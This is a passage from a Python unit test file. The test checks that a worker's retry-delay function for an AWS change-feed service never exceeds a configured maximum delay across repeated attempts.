        self.assertNotEqual(first, second)

    def test_the_delay_never_exceeds_max_retry_after_seconds(self):
        from aws_public_change_feed.worker import _retry_delay

        for attempt in range(1, 20):
            delay = _retry_delay(
                attempt,
                min_interval_seconds=10,
                max_retry_after_seconds=900,
                candidate_id="c1",
            )
            self.assertLessEqual(delay, 900)


if __name__ == "__main__":
    unittest.main()
